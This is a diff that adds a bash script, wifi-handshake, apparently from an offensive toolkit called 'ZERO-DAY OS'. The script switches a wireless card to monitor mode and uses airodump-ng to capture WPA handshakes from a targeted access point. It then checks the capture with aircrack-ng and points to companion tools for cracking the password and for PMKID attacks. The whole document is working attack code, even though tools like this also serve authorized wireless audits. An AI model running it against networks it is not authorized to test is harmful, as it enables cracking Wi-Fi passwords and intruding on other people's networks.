@@ -1,0 +1,74 @@
+#!/bin/bash
+# /usr/local/bin/wifi-handshake
+# Capture WPA handshakes from target AP
+# Usage: wifi-handshake <iface> [bssid] [channel]
+
+IFACE="${1:-wlan0}"
+BSSID="$2"
+CHAN="$3"
+OUTDIR="/opt/cardputer/handshakes"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[!] Root required."
+    exit 1
+fi
+
+mkdir -p "$OUTDIR"
+
+if [ -z "$BSSID" ]; then
+    echo "[*] No target specified. Scanning..."
+    wifi-scan "$IFACE"
+    echo ""
+    echo "[!] Run with target: wifi-handshake $IFACE <BSSID> <CHANNEL>"
+    exit 0
+fi
+
+if [ -z "$CHAN" ]; then
+    echo "[!] Channel required. Usage: wifi-handshake $IFACE $BSSID <CHANNEL>"
+    exit 1
+fi
+
+echo "[*] ZERO-DAY OS — WPA Handshake Capture"
+echo "[*] Target: $BSSID on channel $CHAN"
+echo ""
+
+IFTYPE=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')
+if [ "$IFTYPE" != "monitor" ]; then
+    echo "[*] Setting $IFACE to monitor mode..."
+    ip link set "$IFACE" down
+    iw dev "$IFACE" set type monitor
+    ip link set "$IFACE" up
+    sleep 1
+fi
+
+iw dev "$IFACE" set channel "$CHAN"
+
+OUTFILE="$OUTDIR/${BSSID//:/}_ch${CHAN}_${TIMESTAMP}"
+
+echo "[*] Starting capture on $IFACE channel $CHAN..."
+echo "[*] Target BSSID: $BSSID"
+echo "[*] Output: $OUTFILE.cap"
+echo "[*] Press Ctrl+C once handshake is captured (WPA handshake seen in output)"
+echo ""
+
+airodump-ng "$IFACE" --bssid "$BSSID" --channel "$CHAN" --output-format pcap -w "$OUTFILE"
+
+echo ""
+echo "[*] Capture stopped."
+echo "[*] Output: ${OUTFILE}-01.cap"
+echo ""
+
+if [ -f "${OUTFILE}-01.cap" ]; then
+    echo "[*] Verifying handshake..."
+    if aircrack-ng "${OUTFILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
+        echo "[+] Handshake captured successfully!"
+        echo "[+] Crack with: wifi-crack ${OUTFILE}-01.cap"
+    else
+        echo "[!] No handshake found in capture."
+        echo "[*] Try again or use: wifi-pmkid $IFACE $BSSID $CHAN"
+    fi
+fi
+
+iw dev "$IFACE" set type managed 2>/dev/null
+ip link set "$IFACE" up 2>/dev/null
